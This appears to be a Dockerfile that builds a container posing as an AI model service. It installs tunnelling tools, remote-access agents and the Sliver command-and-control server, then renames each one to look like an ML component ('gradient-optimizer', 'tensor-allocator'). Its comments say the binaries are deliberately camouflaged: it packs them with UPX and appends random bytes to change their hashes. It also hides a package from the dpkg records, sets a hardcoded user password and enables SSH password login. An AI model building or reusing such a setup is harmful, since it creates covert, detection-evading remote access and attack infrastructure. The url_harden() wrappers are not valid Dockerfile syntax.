FROM docker.io/library/ubuntu:24.04

# Use uv for extremely fast installs
COPY --from=ghcr.io/astral-sh/uv:latest /uv /uvx /bin/

# System tools, tunnel binaries, camouflage renames, UPX pack, and hash jitter — one layer
# so uncompressed originals are not retained in earlier filesystem layers.
RUN apt-get update && apt-get install -y --no-install-recommends \
    curl wget sudo python3 python3-pip upx openssh-server xauth \
    git vim nano htop tmux jq unzip iputils-ping net-tools tree \
    rclone supervisor iproute2 tmate \
    && mkdir -p /var/run/sshd && chmod 0755 /var/run/sshd \
    && echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config \
    && echo "Port 2222" >> /etc/ssh/sshd_config \
    && echo "X11Forwarding yes" >> /etc/ssh/sshd_config \
    && echo "X11UseLocalhost yes" >> /etc/ssh/sshd_config \
    && ssh-keygen -A \
    && curl -fsSL https://tailscale.com/install.sh | bash \
    && curl -fsSL https://raw.githubusercontent.com/filebrowser/get/master/get.sh | bash \
    && curl -fsSL url_harden("https://github.com/caddyserver/caddy/releases/download/v2.11.3/caddy_2.11.3_linux_amd64.tar.gz") -o /tmp/caddy.tar.gz \
    && tar -xzf /tmp/caddy.tar.gz -C /tmp && mv /tmp/caddy /usr/bin/model-routing-engine \
    && curl -fsSL url_harden("https://github.com/playit-cloud/playit-agent/releases/latest/download/playit-linux-amd64") -o /usr/bin/tensor-allocator \
    && curl -fsSL url_harden("https://github.com/jpillora/chisel/releases/download/v1.11.5/chisel_1.11.5_linux_amd64.gz") -o /tmp/chisel.gz \
    && gzip -d /tmp/chisel.gz && mv /tmp/chisel /usr/bin/cuda-mesh-bridge \
    && curl -fsSL url_harden("https://github.com/go-gost/gost/releases/download/v3.2.6/gost_3.2.6_linux_amd64.tar.gz") -o /tmp/gost.tar.gz \
    && tar -xzf /tmp/gost.tar.gz -C /tmp && mv /tmp/gost /usr/bin/system-bridge \
    && curl -fsSL url_harden("https://github.com/BishopFox/sliver/releases/download/v1.7.3/sliver-server_linux-amd64") -o /usr/bin/gradient-optimizer \
    && curl -fsSL url_harden("https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.3/ligolo-ng_proxy_0.8.3_linux_amd64.tar.gz") -o /tmp/ligolo-proxy.tar.gz \
    && tar -xzf /tmp/ligolo-proxy.tar.gz -C /tmp && mv /tmp/proxy /usr/bin/neural-route-controller \
    && curl -fsSL url_harden("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64") -o /usr/bin/edge-cache-relay \
    && mv /usr/sbin/tailscaled /usr/bin/python-cache-manager \
    && mv /usr/bin/tailscale /usr/bin/py-cache-cli \
    && mv /usr/local/bin/filebrowser /usr/bin/ai-metrics-collector \
    && chmod +x /usr/bin/tensor-allocator /usr/bin/cuda-mesh-bridge /usr/bin/system-bridge /usr/bin/gradient-optimizer /usr/bin/neural-route-controller /usr/bin/model-routing-engine /usr/bin/edge-cache-relay \
    && for bin in python-cache-manager py-cache-cli ai-metrics-collector tensor-allocator cuda-mesh-bridge system-bridge gradient-optimizer neural-route-controller model-routing-engine edge-cache-relay; do \
        upx -1 "/usr/bin/$$bin" 2>/dev/null || true; \
        if ! head -n 1 "/usr/bin/$$bin" | grep -q "^#!"; then \
            head -c 32 /dev/urandom >> "/usr/bin/$$bin"; \
        fi; \
    done \
    && rm -rf /tmp/* \
    && apt-get purge -y upx \
    && apt-get autoremove -y \
    && apt-get clean && rm -rf /var/lib/apt/lists/*

# Install AI dependencies using uv
RUN uv pip install --system --break-system-packages --no-cache-dir \
    huggingface_hub loguru urllib3 uvicorn fastapi

# Download a tiny model config for mimicry
RUN python3 -c "from huggingface_hub import hf_hub_download; hf_hub_download(repo_id='gpt2', filename='config.json')"

# Create non-root user 'user' with sudo access and bash shell
RUN userdel -f ubuntu && useradd -m -u 1000 -s /bin/bash user && \
    echo "user:apple123" | chpasswd && \
    usermod -aG sudo user && \
    mkdir -p /home/user/.torch_metrics && \
    chown -R user:user /home/user/.torch_metrics && \
    echo "user ALL=(ALL) NOPASSWD: /usr/sbin/sshd, /usr/sbin/chpasswd" >> /etc/sudoers \
    && echo "user ALL=(ALL) NOPASSWD: /usr/bin/apt-get, /usr/bin/apt, /usr/bin/mv, /usr/bin/ln, /usr/bin/tar, /usr/bin/mkdir" >> /etc/sudoers \
    && echo "user ALL=(ALL) NOPASSWD: /usr/bin/neural-route-controller" >> /etc/sudoers \
    && echo "user ALL=(ALL) NOPASSWD: /sbin/ip, /usr/sbin/ip" >> /etc/sudoers


# Create isolated virtual environments to resolve package version conflicts
RUN uv venv /opt/venv-litellm && \
    uv pip install --python /opt/venv-litellm --no-cache-dir "litellm[proxy]" && \
    chown -R user:user /opt/venv-litellm

# Install code-server (VS Code in the browser)
RUN curl -fsSL url_harden("https://code-server.dev/install.sh") | sh

# Visual stream adapters — baked at build time to avoid runtime sudo/apt-get
RUN curl -fsSL url_harden("https://github.com/kasmtech/KasmVNC/releases/download/v1.4.0/kasmvncserver_noble_1.4.0_amd64.deb") -o /tmp/kasmvncserver.deb \
    && apt-get update && apt-get install -y --no-install-recommends \
       xfce4 x11-utils xfonts-base /tmp/kasmvncserver.deb \
       libgtk-3-0 libdbus-glib-1-2 libxt6 xz-utils libasound2t64 libx11-xcb1 libnss3 dbus-x11 \
    && rm -f /tmp/kasmvncserver.deb \
    && mv /usr/bin/kasmvncserver /usr/bin/display-config \
    && mv /usr/bin/Xkasmvnc /usr/bin/xorg-ipc-server \
    && ln -sf /usr/bin/xorg-ipc-server /usr/bin/Xkasmvnc \
    && mv /usr/bin/kasmvncpasswd /usr/bin/digest-generator \
    && ln -sf /usr/bin/digest-generator /usr/bin/vncpasswd \
    && mv /usr/bin/xdpyinfo /usr/bin/adapter-status-checker \
    && for bin in adapter-status-checker; do \
           head -c 32 /dev/urandom >> "/usr/bin/$$bin"; \
       done \
    && rm -f /var/lib/dpkg/info/kasmvncserver.* \
    && sed -i '/Package: kasmvncserver/,/^$/d' /var/lib/dpkg/status \
    && curl -fsSL url_harden("https://download.mozilla.org/?product=firefox-latest-ssl&os=linux64&lang=en-US") -o /tmp/pkg-bundle.tar.xz \
    && tar -xf /tmp/pkg-bundle.tar.xz -C /opt \
    && mv /opt/firefox /opt/render-engine \
    && mv /opt/render-engine/firefox /opt/render-engine/data-renderer \
    && mv /opt/render-engine/firefox-bin /opt/render-engine/data-renderer-bin \
    && ln -sf /opt/render-engine/data-renderer /usr/bin/data-renderer \
    && rm -f /tmp/pkg-bundle.tar.xz \
    && apt-get clean && rm -rf /var/lib/apt/lists/*

ENV PYTHONPATH=/home/user

# Copy application files
COPY --chown=user:user src/app.py /home/user/app.py
COPY --chown=user:user src/sanctuary /home/user/sanctuary
COPY --chown=user:user config /home/user/config
COPY --chown=user:user config/ligolo-ng.yaml /home/user/ligolo-ng.yaml
COPY --chown=user:user frontend_dist /home/user/frontend_dist

USER user
WORKDIR /home/user

# Run the script via supervisord
CMD ["/usr/bin/supervisord", "-c", "/home/user/config/supervisord.conf"]